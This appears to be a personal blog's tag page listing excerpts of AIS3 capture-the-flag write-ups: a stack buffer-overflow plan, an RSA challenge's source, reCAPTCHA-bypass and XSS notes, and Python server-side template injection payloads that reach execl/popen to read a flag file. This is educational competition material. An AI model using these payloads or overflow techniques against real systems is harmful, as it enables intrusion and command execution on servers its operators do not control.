<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/tags/ais3/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="AIS3"><meta property="og:locale" content="en_us"><meta property="og:type" content="website"><title>AIS3 | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/tags/ais3/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script><link rel=alternate type=application/rss+xml href=https://bernie6401.github.io/tags/ais3/index.xml title="SBK Hugo Site"></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>AIS3</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav><ul><li class=book-section-flat><strong>Categories</strong><ul></ul></li><li class=book-section-flat><strong>Tags</strong><ul><li class="flex justify-between"><a href=/tags/ad/>AD</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/adworld/>Adworld</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/aegis/>AEGIS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ai/>AI</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ais3/>AIS3</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/android/>Android</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/balsnctf/>BalsnCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/book/>Book</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/btlo/>BTLO</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/cggc/>CGGC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/chatgpt/>ChatGPT</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/crewctf/>CrewCTF</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/crypto/>Crypto</a>
<span>36</span></li><li class="flex justify-between"><a href=/tags/cryptography/>Cryptography</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/csc/>CSC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ctf/>CTF</a>
<span>267</span></li><li class="flex justify-between"><a href=/tags/cyberdefender/>CyberDefender</a>
<span>23</span></li><li class="flex justify-between"><a href=/tags/data-structure/>Data Structure</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/deadfacectf/>DeadFaceCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/digital-forensics/>Digital Forensics</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/drozer/>Drozer</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/easy/>Easy</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/eductf/>Eductf</a>
<span>85</span></li><li class="flex justify-between"><a href=/tags/endpoint-forensics/>Endpoint Forensics</a>
<span>16</span></li><li class="flex justify-between"><a href=/tags/english-writing/>English Writing</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/forensics/>Forensics</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/general-skill/>General Skill</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/hackthebox/>Hackthebox</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/incident-response/>Incident Response</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/information-security/>Information Security</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/interview/>Interview</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/latex/>LaTeX</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/leetcode/>LeetCode</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/machine-learning/>Machine Learning</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/malware-reverse-engineering-and-analysis/>Malware Reverse Engineering and Analysis</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/meeting-paper/>Meeting Paper</a>
<span>20</span></li><li class="flex justify-between"><a href=/tags/misc/>Misc</a>
<span>44</span></li><li class="flex justify-between"><a href=/tags/mobsf/>MobSF</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/network-forensics/>Network Forensics</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/nisra/>NISRA</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu/>NTU</a>
<span>67</span></li><li class="flex justify-between"><a href=/tags/ntu_ct/>NTU_CT</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/ntu_ml/>NTU_ML</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/ntu_mr/>NTU_MR</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/ntu_os/>NTU_OS</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/ntu_padns/>NTU_PADNS</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu_st/>NTU_ST</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/ntucns/>NTUCNS</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/ntust/>NTUST</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ntustisc/>NTUSTISC</a>
<span>32</span></li><li class="flex justify-between"><a href=/tags/ntustws/>NTUSTWS</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/nycu/>NYCU</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/picoctf/>PicoCTF</a>
<span>112</span></li><li class="flex justify-between"><a href=/tags/portswigger-web-security-academy/>Portswigger Web Security Academy</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/problem-solution/>Problem Solution</a>
<span>28</span></li><li class="flex justify-between"><a href=/tags/pwn/>PWN</a>
<span>57</span></li><li class="flex justify-between"><a href=/tags/reverse/>Reverse</a>
<span>46</span></li><li class="flex justify-between"><a href=/tags/security-operation/>Security Operation</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/side-project/>Side Project</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/software-testing/>Software Testing</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/special-topic/>Special Topic</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/taiwanholyhigh/>TaiwanHolyHigh</a>
<span>9</span></li><li class="flex justify-between"><a href=/tags/tcivs/>TCIVS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/threat-intel/>Threat Intel</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/tools/>Tools</a>
<span>19</span></li><li class="flex justify-between"><a href=/tags/tscctf/>TSCCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/web/>Web</a>
<span>93</span></li><li class="flex justify-between"><a href=/tags/welcome/>Welcome</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/windows/>Windows</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B/>名詞解釋</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/%E8%AE%80%E6%9B%B8%E5%BF%83%E5%BE%97/>讀書心得</a>
<span>2</span></li></ul></li></ul></nav></aside></header><article class="markdown book-post"><h2><a href=/security/competition/ais3-eof-2023-%E5%88%9D%E8%B3%BD/>AIS3 EOF 2023 初賽</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/ais3/>AIS3</a></div><p><h1 id=ais3-eof-2023-初賽>AIS3 EOF 2023 初賽
<a class=anchor href=#ais3-eof-2023-%e5%88%9d%e8%b3%bd>#</a></h1><h2 id=pwn>PWN
<a class=anchor href=#pwn>#</a></h2><h3 id=real_rop>real_rop
<a class=anchor href=#real_rop>#</a></h3><h4 id=description>Description
<a class=anchor href=#description>#</a></h4><ul><li><p>Challenge <a href=https://share.ctf.zoolab.org/>URL</a></p></li><li><p>Folder structure:</p><pre tabindex=0><code>Share
├── share
│   ├── chal
│   ├── flag
│   ├── Makefile
│   ├── real_rop++.c
│   └── run.sh
├── docker-compose.yaml
├── Dockerfile
└── xinetd
</code></pre></li></ul><h4 id=original-code>Original Code
<a class=anchor href=#original-code>#</a></h4><pre tabindex=0><code class=language-cpp! data-lang=cpp!>#include &lt;unistd.h&gt;

int main()
{
    char buf[0x10];

    read(0, buf, 0x30);
    write(1, buf, 0x30);
    
    return 0;
}
</code></pre><pre tabindex=0><code class=language-make! data-lang=make!>gcc -fno-stack-protector -o chal real_rop++.c
</code></pre><ul><li>Obviously buffer overflow but not much</li><li>Preliminary idea is <code>one_gadget</code></li><li>Check protector<pre tabindex=0><code class=language-bash! data-lang=bash!>$ checksec chal
[*] &#39;/home/sbk6401/CTF/AIS3/PWN/real_rop/share/chal&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre></li><li><code>PIE</code> is enabled → use write function to leak <code>libc</code> address</li><li><code>Full RELRO</code> → cannot use <code>GOT hijacking</code></li><li>Refer to <a href=https://hackmd.io/Prmz9YuOQsiHGXrTuYMzFw?view#Real_rop>大神write up</a>, we cannot leak <code>libc</code> address and get shell at one time. So, we can control <code>$rip</code> and return to the beginning of <code>main</code> function and go through the process again. That is, <font color=FF0000>we have another <code>read</code> function</font> to fill in <code>one_gadget</code>.</li><li>Note that, <strong>the version of Ubuntu and Glibc is VERY VERY important</strong>, according to <code>Dockerfile</code>, it seems use Ubuntu 20.04 with default<pre tabindex=0><code class=language-dockerfile! data-lang=dockerfile!>FROM ubuntu:20.04
MAINTAINER u1f383

RUN apt-get update &amp;&amp; \
    DEBAIN_FRONTEND=noninteractive apt-get install -qy xinetd

RUN useradd -m chal
RUN chown -R root:root /home/chal
RUN chmod -R 755 /home/chal

CMD [&#34;/usr/sbin/xinetd&#34;, &#34;-dontfork&#34;]
</code></pre></li></ul><h4 id=analyze-where-to-return>Analyze where to return
<a class=anchor href=#analyze-where-to-return>#</a></h4><ul><li><p><font color=FF0000><strong><code>For Ubuntu 22.04 &　GLIBC 2.35</code> - back to <code>__libc_start_main+121</code></strong></font></p><a href=/security/competition/ais3-eof-2023-%E5%88%9D%E8%B3%BD/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/competition/ais3-eof-2024/>AIS3 EOF 2024</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/ais3/>AIS3</a></div><p><h1 id=ais3-eof-2024>AIS3 EOF 2024
<a class=anchor href=#ais3-eof-2024>#</a></h1><p><img src=https://hackmd.io/_uploads/BkNtOJddp.png alt=圖片></p><h2 id=crypto>Crypto
<a class=anchor href=#crypto>#</a></h2><h3 id=baby-rsa>Baby RSA
<a class=anchor href=#baby-rsa>#</a></h3><h4 id=source-code>Source Code
<a class=anchor href=#source-code>#</a></h4><p>:::spoiler Source Code</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#! /usr/bin/python3</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> bytes_to_long, long_to_bytes, getPrime
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> secret <span style=color:#f92672>import</span> FLAG
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>encrypt</span>(m, e, n):
</span></span><span style=display:flex><span>    enc <span style=color:#f92672>=</span> pow(bytes_to_long(m), e, n)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> enc
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decrypt</span>(c, d, n):
</span></span><span style=display:flex><span>    dec <span style=color:#f92672>=</span> pow(c, d, n)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> long_to_bytes(dec)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>        p <span style=color:#f92672>=</span> getPrime(<span style=color:#ae81ff>1024</span>)
</span></span><span style=display:flex><span>        q <span style=color:#f92672>=</span> getPrime(<span style=color:#ae81ff>1024</span>)
</span></span><span style=display:flex><span>        n <span style=color:#f92672>=</span> p <span style=color:#f92672>*</span> q
</span></span><span style=display:flex><span>        phi <span style=color:#f92672>=</span> (p <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> (q <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>        e <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> phi <span style=color:#f92672>%</span> e <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span> : 
</span></span><span style=display:flex><span>            d <span style=color:#f92672>=</span> pow(e, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, phi)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>p<span style=color:#e6db74>=}</span><span style=color:#e6db74>, </span><span style=color:#e6db74>{</span>q<span style=color:#e6db74>=}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>n<span style=color:#e6db74>=}</span><span style=color:#e6db74>, </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>=}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;FLAG: &#34;</span>, encrypt(FLAG, e, n))
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>3</span>):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>            c <span style=color:#f92672>=</span> int(input(<span style=color:#e6db74>&#34;Any message for me?&#34;</span>))
</span></span><span style=display:flex><span>            m <span style=color:#f92672>=</span> decrypt(c, d, n)
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>&#34;How beautiful the message is, it makes me want to destroy it .w.&#34;</span>)
</span></span><span style=display:flex><span>            new_m <span style=color:#f92672>=</span> long_to_bytes(bytes_to_long(m) <span style=color:#f92672>^</span> bytes_to_long(os<span style=color:#f92672>.</span>urandom(<span style=color:#ae81ff>8</span>)))
</span></span><span style=display:flex><span>            print( <span style=color:#e6db74>&#34;New Message: &#34;</span>, encrypt(new_m, e, n) )
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>&#34;?&#34;</span>)
</span></span><span style=display:flex><span>            exit()
</span></span><span style=display:flex><span>        
</span></span></code></pre></div><p>:::</p><a href=/security/competition/ais3-eof-2024/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/competition/ais3-pre-exam-2023/>AIS3 Pre-Exam 2023</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/ais3/>AIS3</a></div><p><h1 id=ais3-pre-exam-2023>AIS3 Pre-Exam 2023
<a class=anchor href=#ais3-pre-exam-2023>#</a></h1><h6 id=tags-ctf-eof2023>tags: <code>CTF</code> <code>EOF2023</code>
<a class=anchor href=#tags-ctf-eof2023>#</a></h6><p>:::spoiler TOC
[TOC]
:::</p><h2 id=web>Web
<a class=anchor href=#web>#</a></h2><h3 id=e-portfolio-baby>E-Portfolio baby
<a class=anchor href=#e-portfolio-baby>#</a></h3><h4 id=recon>Recon
<a class=anchor href=#recon>#</a></h4><p>直接用Burp Suite可以繞過reCAPTCHA，而且About Guest的內容會被完整的render出來達到XSS</p><h3 id=login-panel>Login Panel
<a class=anchor href=#login-panel>#</a></h3><h4 id=recon-1>Recon
<a class=anchor href=#recon-1>#</a></h4><ul><li><a href=https://www.readfog.com/a/1640970212456108032>我又找到了一個破解谷歌驗證碼的新方案！</a></li><li><a href=https://yescaptcha.com/dashboard.html>yescaptcha</a></li></ul><h2 id=reverse>Reverse
<a class=anchor href=#reverse>#</a></h2><h2 id=pwn>Pwn
<a class=anchor href=#pwn>#</a></h2><h3 id=simply-pwn>Simply Pwn
<a class=anchor href=#simply-pwn>#</a></h3><h4 id=recon-2>Recon
<a class=anchor href=#recon-2>#</a></h4><ol><li><code>checksec</code><pre tabindex=0><code class=language-bash! data-lang=bash!>$ checksec pwn
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/sbk6401/.cache/.pwntools-cache-3.7/update to &#39;never&#39; (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.9.0)
[*] &#39;/home/sbk6401/CTF/AIS3-Pre-Exam/PWN/Simply Pwn/pwn&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
</code></pre></li></ol><h2 id=misc>Misc
<a class=anchor href=#misc>#</a></h2><h3 id=welcome>Welcome
<a class=anchor href=#welcome>#</a></h3><p>縮小檔案就看的到flag了
Flag: <code>AIS3{WELCOME-TO-2023-PRE-EXAM-&-MY-FIRST-CTF}</code></p><a href=/security/competition/ais3-pre-exam-2023/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/competition/eof-ais3-final/>EOF AIS3 Final</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/ais3/>AIS3</a></div><p><h1 id=eof-ais3-final>EOF AIS3 Final
<a class=anchor href=#eof-ais3-final>#</a></h1><h6 id=tags-ctf-ais3>tags: <code>CTF</code> <code>AIS3</code>
<a class=anchor href=#tags-ctf-ais3>#</a></h6><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2><p><a href=https://jzchangmark.wordpress.com/2015/03/05/%E9%80%8F%E9%81%8E-selenium-%E6%93%8D%E4%BD%9C%E4%B8%8B%E6%8B%89%E5%BC%8F%E9%81%B8%E5%96%AE-select/>https://jzchangmark.wordpress.com/2015/03/05/%E9%80%8F%E9%81%8E-selenium-%E6%93%8D%E4%BD%9C%E4%B8%8B%E6%8B%89%E5%BC%8F%E9%81%B8%E5%96%AE-select/</a></p><p><a href=https://www.qnx.com/developers/docs/7.1/#com.qnx.doc.neutrino.lib_ref/topic/s/spawnl.html>https://www.qnx.com/developers/docs/7.1/#com.qnx.doc.neutrino.lib_ref/topic/s/spawnl.html</a></p><p><a href=https://github.com/mhchia/practice/blob/master/ctf/final/write_up.md>https://github.com/mhchia/practice/blob/master/ctf/final/write_up.md</a></p><p>SSTI: <a href=https://www.freebuf.com/articles/network/258136.html>https://www.freebuf.com/articles/network/258136.html</a>
<a href=https://www.compart.com/en/unicode/U+FF5B>https://www.compart.com/en/unicode/U+FF5B</a>
<a href=https://chinnidiwakar.gitbook.io/githubimport/pentesting-web/ssti-server-side-template-injection>https://chinnidiwakar.gitbook.io/githubimport/pentesting-web/ssti-server-side-template-injection</a></p><p>Payload:</p><pre tabindex=0><code class=language-python! data-lang=python!>print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&#39;execl&#39;](&#34;/bin/cat&#34;, &#34;cat&#34;, &#34;./flag.txt&#34;))


print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&#39;popen&#39;](&#34;cat /flag.txt&#34;))

file = &#39;FLAG.TXT&#39;
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&#39;execl&#39;](&#34;/bin/cat&#34;, &#34;cat&#34;, file.lower()))

file = &#39;FLAG.TXT&#39;
command = &#39;EXECL&#39;
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[command.lower()](&#34;/bin/cat&#34;, &#34;cat&#34;, file.lower()))


file = &#39;FLAG.TXT&#39;
print(().__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&#39;spawnl&#39;](&#39;P_WAIT&#39;, &#34;/bin/cat&#34;, &#34;cat&#34;, file.lower()))
</code></pre><h2 id=script---run_scriptpy>Script - run_script.py
<a class=anchor href=#script---run_scriptpy>#</a></h2><p>:::spoiler</p><pre tabindex=0><code class="language-python=" data-lang="python=">import subprocess
import time
import multiprocessing as mp


def cycle(i):
    subprocess.call([&#39;python&#39;, &#39;script.py&#39;, &#39;--team&#39;, str(i)])

if __name__ == &#34;__main__&#34;:
    p1 = mp.Process(target=cycle, args=(&#39;1&#39;,))
    p2 = mp.Process(target=cycle, args=(&#39;2&#39;,))
    # p3 = mp.Process(target=cycle, args=(&#39;3&#39;,))
    # p4 = mp.Process(target=cycle, args=(&#39;4&#39;,))
    # p5 = mp.Process(target=cycle, args=(&#39;5&#39;,))
    # p7 = mp.Process(target=cycle, args=(&#39;7&#39;,))
    # p8 = mp.Process(target=cycle, args=(&#39;8&#39;,))
    # p9 = mp.Process(target=cycle, args=(&#39;9&#39;,))
    # p10 = mp.Process(target=cycle, args=(&#39;10&#39;,))
    # p11 = mp.Process(target=cycle, args=(&#39;11&#39;,))
    # p12 = mp.Process(target=cycle, args=(&#39;12&#39;,))
    # p13 = mp.Process(target=cycle, args=(&#39;13&#39;,))
    # p14 = mp.Process(target=cycle, args=(&#39;14&#39;,))
    # p15 = mp.Process(target=cycle, args=(&#39;15&#39;,))
    # p16 = mp.Process(target=cycle, args=(&#39;16&#39;,))
    # p17 = mp.Process(target=cycle, args=(&#39;17&#39;,))
    # p18 = mp.Process(target=cycle, args=(&#39;18&#39;,))
    # p19 = mp.Process(target=cycle, args=(&#39;19&#39;,))
    # p20 = mp.Process(target=cycle, args=(&#39;20&#39;,))
    # p21 = mp.Process(target=cycle, args=(&#39;21&#39;,))
    # p22 = mp.Process(target=cycle, args=(&#39;22&#39;,))
    # p23 = mp.Process(target=cycle, args=(&#39;23&#39;,))
    # p24 = mp.Process(target=cycle, args=(&#39;24&#39;,))
    

    p1.start()
    time.sleep(2)
    p2.start()
    time.sleep(2)
    # p3.start()
    # p4.start()
    # p5.start()
    # p7.start()
    # p8.start()
    # p9.start()
    # p10.start()
    # p11.start()
    # p12.start()
    # p13.start()
    # p14.start()
    # p15.start()
    # p16.start()
    # p17.start()
    # p18.start()
    # p19.start()
    # p20.start()
    # p21.start()
    # p22.start()
    # p23.start()
    # p24.start()

    p1.join()
    p2.join()
    # p3.join()
    # p4.join()
    # p5.join()
    # p7.join()
    # p8.join()
    # p9.join()
    # p10.join()
    # p11.join()
    # p12.join()
    # p13.join()
    # p14.join()
    # p15.join()
    # p16.join()
    # p17.join()
    # p18.join()
    # p19.join()
    # p20.join()
    # p21.join()
    # p22.join()
    # p23.join()
    # p24.join()
</code></pre><p>:::</p><a href=/security/competition/eof-ais3-final/>...</a></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav><ul><li class=book-section-flat><strong>Categories</strong><ul></ul></li><li class=book-section-flat><strong>Tags</strong><ul><li class="flex justify-between"><a href=/tags/ad/>AD</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/adworld/>Adworld</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/aegis/>AEGIS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ai/>AI</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ais3/>AIS3</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/android/>Android</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/balsnctf/>BalsnCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/book/>Book</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/btlo/>BTLO</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/cggc/>CGGC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/chatgpt/>ChatGPT</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/crewctf/>CrewCTF</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/crypto/>Crypto</a>
<span>36</span></li><li class="flex justify-between"><a href=/tags/cryptography/>Cryptography</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/csc/>CSC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ctf/>CTF</a>
<span>267</span></li><li class="flex justify-between"><a href=/tags/cyberdefender/>CyberDefender</a>
<span>23</span></li><li class="flex justify-between"><a href=/tags/data-structure/>Data Structure</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/deadfacectf/>DeadFaceCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/digital-forensics/>Digital Forensics</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/drozer/>Drozer</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/easy/>Easy</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/eductf/>Eductf</a>
<span>85</span></li><li class="flex justify-between"><a href=/tags/endpoint-forensics/>Endpoint Forensics</a>
<span>16</span></li><li class="flex justify-between"><a href=/tags/english-writing/>English Writing</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/forensics/>Forensics</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/general-skill/>General Skill</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/hackthebox/>Hackthebox</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/incident-response/>Incident Response</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/information-security/>Information Security</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/interview/>Interview</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/latex/>LaTeX</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/leetcode/>LeetCode</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/machine-learning/>Machine Learning</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/malware-reverse-engineering-and-analysis/>Malware Reverse Engineering and Analysis</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/meeting-paper/>Meeting Paper</a>
<span>20</span></li><li class="flex justify-between"><a href=/tags/misc/>Misc</a>
<span>44</span></li><li class="flex justify-between"><a href=/tags/mobsf/>MobSF</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/network-forensics/>Network Forensics</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/nisra/>NISRA</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu/>NTU</a>
<span>67</span></li><li class="flex justify-between"><a href=/tags/ntu_ct/>NTU_CT</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/ntu_ml/>NTU_ML</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/ntu_mr/>NTU_MR</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/ntu_os/>NTU_OS</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/ntu_padns/>NTU_PADNS</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu_st/>NTU_ST</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/ntucns/>NTUCNS</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/ntust/>NTUST</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ntustisc/>NTUSTISC</a>
<span>32</span></li><li class="flex justify-between"><a href=/tags/ntustws/>NTUSTWS</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/nycu/>NYCU</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/picoctf/>PicoCTF</a>
<span>112</span></li><li class="flex justify-between"><a href=/tags/portswigger-web-security-academy/>Portswigger Web Security Academy</a>
